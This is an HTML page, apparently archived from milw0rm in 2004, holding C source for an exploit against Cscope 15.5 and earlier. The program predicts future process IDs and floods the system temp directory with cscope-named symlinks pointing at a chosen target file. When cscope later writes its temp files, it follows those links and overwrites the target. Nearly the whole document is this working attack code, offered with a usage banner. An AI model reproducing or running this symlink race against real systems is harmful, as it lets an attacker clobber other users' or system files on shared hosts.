<html><head><title>Cscope <= 15.5 Symlink Vulnerability Exploit</title></head><pre>/* RXcscope exploit version 15.5 and minor */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;

#define BSIZE 64

int
main(int ac, char *av[]) {
        pid_t cur;
        u_int i=0, lst;
        char buffer[BSIZE + 1];
        
        fprintf(stdout, &quot;\n --[ Cscope Exploit ]--\n&quot;\
                        &quot; version 15.5 and minor \n&quot; \
                        &quot; Gangstuck / Psirac\n&quot; \
                        &quot; &lt;research@rexotec.com&gt;\n\n&quot;);
                        
        if (ac != 3) {
                fprintf(stderr, &quot;Usage: %s &lt;target&gt; &lt;max file creation&gt;\n&quot;, av[0]);
                return 1;
        }
        
        cur=getpid();
        lst=cur+atoi(av[2]);
        
        fprintf(stdout, &quot; -&gt; Current process id is ..... [%5d]\n&quot; \
                        &quot; -&gt; Last process id is ........ [%5d]\n&quot;, cur, lst);
        
        while (++cur != lst) {
                snprintf(buffer, BSIZE, &quot;%s/cscope%d.%d&quot;, P_tmpdir, cur, (i==2) ? --i : ++i);
                symlink(av[1], buffer);
        }

        return 0;
}

// milw0rm.com [2004-12-17]</pre></html>